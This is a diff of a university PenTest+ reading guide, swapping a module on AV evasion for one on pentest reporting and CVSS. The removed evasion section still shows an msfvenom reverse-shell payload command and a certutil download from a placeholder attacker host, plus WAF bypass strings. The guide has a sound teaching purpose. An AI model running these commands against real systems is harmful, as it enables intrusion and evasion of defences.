@@ -1,59 +1,176 @@
-# Reading Guide: Module 14 - Evasion Techniques and AV Bypass
-## Course: CIS-4333_Penetration_Testing (CompTIA PenTest+)
+# Reading Guide: Module 14 — Penetration Testing Reports
+
+## Course: CIS-4333 Penetration Testing
+
+## Texas Wesleyan University | Professor Nash
+
+## Certification Alignment: CompTIA PenTest+ (PT0-002) — Domain 5: Reporting and Communication (18%)
 
 ---
 
-### Introduction
-Welcome to **Module 14 - Evasion Techniques and AV Bypass**! Mature enterprise environments deploy security controls — antivirus (AV), endpoint detection and response (EDR), intrusion detection systems (IDS), and web application firewalls (WAF) — specifically to detect and block penetration testing techniques. Evasion is the discipline of modifying attacks to avoid these controls while still achieving the test objective. Understanding evasion techniques allows pentesters to accurately assess whether an organization's defenses would stop a real-world attacker or merely detect commodity tools. This module maps to the **Attacks and Exploits** domain of PT0-002 (**30% of exam weight**) and the **Tools and Code Analysis** domain (**16% of exam weight**).
+## Introduction
 
-Evasion findings are particularly valuable in pentest reports — demonstrating that an attacker can bypass AV with a custom payload directly challenges a client's assumption that standard AV provides adequate protection.
-
----
-
-### 1. High-Yield Glossary
-Review these essential definitions carefully. The certification exam expects you to know these concepts inside and out:
-
-*   **Payload Encoding and Obfuscation**: Techniques used to transform a payload's byte pattern so that signature-based AV engines do not recognize it as malicious. `msfvenom` supports encoders like `shikata_ga_nai` (x86 XOR encoder) that apply repeated XOR operations to shellcode, changing its byte signature on each iteration. Obfuscation changes the appearance of code (variable renaming, string splitting, junk code insertion) without changing its functionality. Neither technique reliably bypasses modern behavioral AV/EDR, which executes code in a sandbox to observe behavior rather than matching static signatures.
-
-*   **Living Off the Land (LoTL)**: An evasion strategy in which the attacker uses tools and binaries already present on the target system — called LOLBins (Living Off the Land Binaries) — rather than dropping custom malware. Windows examples include `certutil.exe` (download files), `powershell.exe` (execute scripts), `regsvr32.exe` (execute COM objects), and `mshta.exe` (execute HTA files). Because these are legitimate system tools, they often bypass application whitelisting and AV. PT0-002 tests awareness of LoTL as an evasion concept.
-
-*   **Process Injection**: A technique in which an attacker injects malicious code into the memory space of a legitimate running process to execute it under that process's identity and security context. Common methods include DLL injection, process hollowing, and reflective DLL loading. By running under a trusted process (e.g., `explorer.exe`, `svchost.exe`), the payload evades process-based detection and inherits the host process's privileges and network connections. Meterpreter's `migrate` command performs a form of process injection.
-
-*   **Signature-Based vs. Behavioral Detection**: Signature-based AV matches file content against a database of known malware patterns (hashes, byte sequences). Behavioral/heuristic detection observes what code does at runtime — monitoring API calls, memory allocations, network connections, and process spawning — to identify malicious activity patterns regardless of the code's appearance. Modern EDR products primarily use behavioral detection, making static encoding/obfuscation insufficient as a standalone evasion technique.
-
-*   **Custom Payload Generation and `msfvenom` Options**: Beyond basic encoding, `msfvenom` supports output format selection (`-f exe`, `-f elf`, `-f raw`, `-f python`), payload stageless vs. staged selection, and multiple encoder iterations (`-i 10` for 10 encoding rounds). For AV bypass, testers may use custom C/C++ shellcode loaders, Python-based payload wrappers, or commercial tools like Cobalt Strike's payload generator that produce less-detectable artifacts than standard Metasploit payloads.
+Welcome to Module 14. The penetration testing report is the primary deliverable of any
+engagement. Regardless of how thorough or sophisticated the technical work was, the client
+receives value only through clear, well-structured, and actionable communication. This module
+covers report types, CVSS scoring, finding quality standards, sensitive data handling,
+attestation, and client debriefing techniques. All of this content maps directly to PenTest+
+Domain 5: Reporting and Communication, which represents 18% of the PT0-002 exam.
 
 ---
 
-### 2. Certification Exam Tips
-*   **Domain Weight:** Evasion content appears in both Attacks and Exploits (30%) and Tools and Code Analysis (16%). Know the evasion category names and when each approach is appropriate.
-*   **Encoding Does Not Reliably Bypass Modern AV:** PT0-002 tests that modern behavioral AV/EDR is not reliably bypassed by payload encoding alone. The `shikata_ga_nai` encoder in msfvenom is widely signature-known. Real bypass requires behavioral evasion, LoTL techniques, or custom payloads. Know this distinction for scenario questions.
-*   **WAF Evasion Techniques:** Web Application Firewalls can be evaded by: case manipulation (`SeLeCt` instead of `SELECT`), comment injection (`SEL/**/ECT`), URL encoding (`%27` instead of `'`), double encoding, and using alternative SQL syntax. PT0-002 tests basic WAF evasion awareness.
-*   **IDS/IPS Evasion:** Network-based IDS evasion techniques include: packet fragmentation, TTL manipulation, protocol-level obfuscation, and timing attacks (slow scans with `-T0` in Nmap). Know that IDS evasion is distinct from AV/EDR evasion — it operates at the network layer rather than the endpoint.
-*   **Exam Trap — Evasion Requires Authorization:** Testing AV bypass techniques against a client's environment requires explicit scope authorization. If AV testing is not in the Rules of Engagement, the tester should not attempt to bypass endpoint controls even if technically capable.
-*   **Study Resource:** [TryHackMe Pentest Learning Path](https://tryhackme.com/path/outline/pentesting) — The "Obfuscation," "AV Evasion," and "Evading IDS/Firewalls" rooms provide browser-based guided practice with payload encoding, obfuscation techniques, and behavioral detection evasion concepts in a legal lab environment.
-*   **Video Lecture:** [CompTIA PenTest+ Complete Course by freeCodeCamp](https://www.youtube.com/watch?v=3Kq1MIfC-4U) — Navigate to the Evasion Techniques section for content covering AV bypass methods, LoTL techniques, and detection evasion concepts mapped to PT0-002 domains 3 and 5.
+## 1. High-Yield Glossary
+
+Review these definitions carefully before the quiz and exam.
+
+- **Executive Summary**: The report section written for non-technical business stakeholders
+  (CISO, CIO, board). Contains overall risk posture, narrative of critical findings,
+  remediation priorities, and attestation. Avoids technical jargon.
+
+- **Technical Report**: The detailed report section written for security engineers and
+  administrators. Contains finding descriptions, evidence, reproduction steps, CVSS scores,
+  and specific remediation guidance.
+
+- **CVSS (Common Vulnerability Scoring System)**: Industry-standard 0.0–10.0 scoring system
+  for vulnerability severity. Version 3.1 uses Base, Temporal, and Environmental metric groups.
+  The Base Score is computed from Attack Vector, Attack Complexity, Privileges Required,
+  User Interaction, Scope, and three Impact dimensions.
+
+- **Attack Vector (AV)**: CVSS Base metric describing how the vulnerability is reached.
+  Network (N) scores highest risk because no physical proximity is needed.
+
+- **Scope (S)**: CVSS Base metric. "Changed" means successful exploitation can affect
+  resources beyond the vulnerable component's authorization scope — for example, a VM escaping
+  to its hypervisor.
+
+- **Risk Rating**: The reported severity assigned to a finding, which may differ from the raw
+  CVSS Base Score when asset criticality, compensating controls, or threat context justify
+  adjustment.
+
+- **Finding**: The atomic report unit for each confirmed vulnerability. A complete finding
+  contains six components: Title, Description, Evidence, Impact, CVSS Score/Risk Rating, and
+  Remediation.
+
+- **Attestation**: A formal signed statement affirming that the engagement was conducted within
+  agreed scope and that findings accurately represent the state of the environment at time of
+  testing. Protects both tester and client.
+
+- **Non-Disclosure Agreement (NDA)**: A pre-engagement contract prohibiting unauthorized
+  disclosure of client vulnerabilities, methodologies, and findings. NDA obligations survive
+  after the engagement ends.
+
+- **Chain of Custody**: Documentation tracking who collected, handled, stored, and transferred
+  evidence. Establishes integrity and authenticity of findings. Covered in depth in Module 15.
+
+- **Remediation Guidance Document**: A supplemental deliverable providing an action plan with
+  owner assignments and timelines, derived from the technical findings.
+
+- **Scope Verification Document**: Confirms that only authorized targets were tested during
+  the engagement.
 
 ---
 
-### Required Readings & Videos
-To prepare for this module's topics, you must complete the following readings and videos:
-*   **Required Reading:** Complete the AV Evasion and Obfuscation rooms in the [TryHackMe Pentest Learning Path](https://tryhackme.com/path/outline/pentesting). TryHackMe is a browser-based cybersecurity training platform — all labs run in your browser without requiring a local AV test environment. The evasion rooms walk through payload encoding, shellcode obfuscation, and Living Off the Land techniques with guided hands-on exercises against realistic detection environments.
-*   **Required Video:** Watch the Evasion Techniques segment of the [CompTIA PenTest+ Complete Course by freeCodeCamp](https://www.youtube.com/watch?v=3Kq1MIfC-4U). This is a free, full-length PT0-002 prep course on YouTube. Use chapter markers to navigate to the evasion content covering AV bypass, payload obfuscation, process injection, and LoTL binaries.
+## 2. CVSS Severity Thresholds
+
+Memorize these ranges for the exam:
+
+| Score Range | Severity |
+|-------------|----------|
+| 9.0–10.0 | Critical |
+| 7.0–8.9 | High |
+| 4.0–6.9 | Medium |
+| 0.1–3.9 | Low |
+| 0.0 | None / Informational |
 
 ---
 
-### Lab & Command Integration
-In this week's hands-on lab, you will perform the following steps to apply these concepts:
-*   **Generate an encoded payload with msfvenom: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o payload.exe`**: You will generate a Meterpreter payload with five rounds of XOR encoding, observe whether the resulting binary is detected by a lab AV scanner, and compare it against an unencoded payload — demonstrating the limits of signature-based evasion.
-*   **Test a Living Off the Land download technique**: You will use `certutil.exe -urlcache -split -f http://<attacker_ip>/payload.exe payload.exe` to download a file using a built-in Windows binary — documenting why this technique evades application whitelisting controls that block unknown executables but permit signed system tools.
-*   **Migrate a Meterpreter session into a legitimate process**: From an active Meterpreter session, you will use the `migrate` command to move the payload's execution into a trusted process, observe how this changes the session's apparent process identity, and document what this technique demonstrates about process-based endpoint detection limitations.
+## 3. Six-Component Finding Structure
+
+Every finding in the technical report must include all six components. Missing any component
+is a deficiency that the exam may test directly.
+
+1. **Title** — Specific, searchable, informative; includes the finding class, affected asset,
+   and severity signal
+2. **Description** — Technical explanation of the vulnerability class, manifestation, and
+   root cause; references CVE and CWE identifiers where applicable
+3. **Evidence** — Verifiable proof: screenshots with timestamps, tool output, file paths,
+   version strings; your IP address visible to confirm authorized testing
+4. **Impact** — Business consequence in plain language; quantified where possible;
+   references applicable regulations (GDPR, PCI-DSS, HIPAA)
+5. **CVSS Score and Risk Rating** — Full vector string and base score; justification if
+   reported rating differs from raw CVSS
+6. **Remediation** — Specific, actionable fix with short-term workaround and long-term
+   solution; references vendor advisories, CIS benchmarks, or NIST controls
 
 ---
 
-### 3. Study Checklist
-- [ ] Read the glossary terms and be able to explain each in your own words.
-- [ ] Complete the AV Evasion and Obfuscation rooms in [TryHackMe Pentest Learning Path](https://tryhackme.com/path/outline/pentesting).
-- [ ] Watch the Evasion Techniques section of the [CompTIA PenTest+ Complete Course by freeCodeCamp](https://www.youtube.com/watch?v=3Kq1MIfC-4U).
-- [ ] Review the lab instructions and understand the purpose of each step before starting.
-- [ ] Proceed to the weekly hands-on lab activity.
+## 4. Certification Exam Tips
+
+- **Domain weight**: Domain 5 (Reporting and Communication) = 18% of PT0-002. Expect 9–12
+  questions on this material.
+
+- **Report type matching**: Exam questions frequently present a scenario and ask which report
+  type or section is appropriate. Executive stakeholders → executive summary. Technical
+  remediation → technical report.
+
+- **CVSS vectors on the exam**: You do not need to calculate exact decimal scores, but you
+  must understand what each metric measures and how high-risk values differ from low-risk
+  values. Know that AV:N is worse than AV:L, and PR:N is worse than PR:H.
+
+- **Scope Changed vs. Unchanged**: A common exam scenario involves a vulnerability that
+  allows escaping a container or VM. That is a Scope Changed scenario and increases the
+  CVSS score significantly.
+
+- **Evidence handling**: The exam tests that evidence must not be fabricated, must be
+  timestamped, and must be encrypted before delivery to the client.
+
+- **Attestation vs. NDA**: These are distinct concepts. Attestation is in the report and
+  affirms accuracy. An NDA is a pre-engagement legal agreement governing confidentiality.
+
+- **Debrief audience**: Exam questions may test that executive debriefs avoid tool names and
+  CVE numbers, while technical debriefs include reproduction steps.
+
+---
+
+## 5. Required Readings and Videos
+
+- **Required Reading**: CompTIA PenTest+ Study Guide (PT0-002), Chapter on Reporting and
+  Communication. Focus on report component definitions, CVSS scoring methodology, and
+  sensitive data handling requirements.
+
+- **Required Video**: Watch the Reporting and Communication segment of the
+  [CompTIA PenTest+ Complete Course by freeCodeCamp](https://www.youtube.com/watch?v=3Kq1MIfC-4U).
+  Use chapter markers to navigate to Domain 5 content.
+
+- **Supplemental Resource**: The [FIRST CVSS v3.1 Specification](https://www.first.org/cvss/v3.1/specification-document)
+  provides the authoritative definition of all Base, Temporal, and Environmental metrics.
+  Review the metric definitions table.
+
+- **Supplemental Resource**: NIST National Vulnerability Database (NVD) at nvd.nist.gov —
+  look up three CVEs of your choice and examine how CVSS scores and vector strings are
+  documented in real vulnerability records.
+
+---
+
+## 6. Lab and Quiz Integration
+
+This week's lab has you draft a two-finding report section using a provided vulnerability
+scenario. You will write a compliant Title, Description, Evidence summary, Impact, CVSS
+vector with score, and Remediation for each finding. Pay close attention to the CVSS
+calculator exercise — you will be asked to justify each metric selection.
+
+The quiz covers CVSS scoring, report component identification, sensitive data handling rules,
+and debrief audience segmentation.
+
+---
+
+## 7. Study Checklist
+
+- [ ] Memorize the six finding components and be able to describe each in your own words
+- [ ] Memorize the four CVSS severity thresholds and their score ranges
+- [ ] Be able to explain each CVSS Base metric and identify which value indicates higher risk
+- [ ] Distinguish executive summary from technical report by audience and content
+- [ ] Understand attestation, NDA, and sensitive data handling requirements
+- [ ] Complete the required reading and video segments
+- [ ] Review the lab instructions before starting the hands-on exercise
+- [ ] Proceed to the weekly quiz on Canvas
